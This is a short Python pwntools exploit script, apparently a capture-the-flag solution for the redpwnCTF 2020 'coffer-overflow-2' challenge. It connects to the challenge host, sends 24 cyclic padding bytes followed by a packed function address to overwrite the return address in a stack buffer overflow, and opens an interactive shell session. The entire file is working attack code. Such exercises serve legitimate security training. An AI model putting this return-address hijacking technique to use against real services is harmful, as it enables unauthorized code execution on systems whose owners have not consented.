from pwn import *

host, port = '2020.redpwnc.tf', 31908

r = remote(host, port)
# r = process('./coffer-overflow-2')

binFunc = 0x04006e6 

payload = cyclic(24)
payload += p64(binFunc)

print(r.recv())
r.sendline(payload)
r.interactive()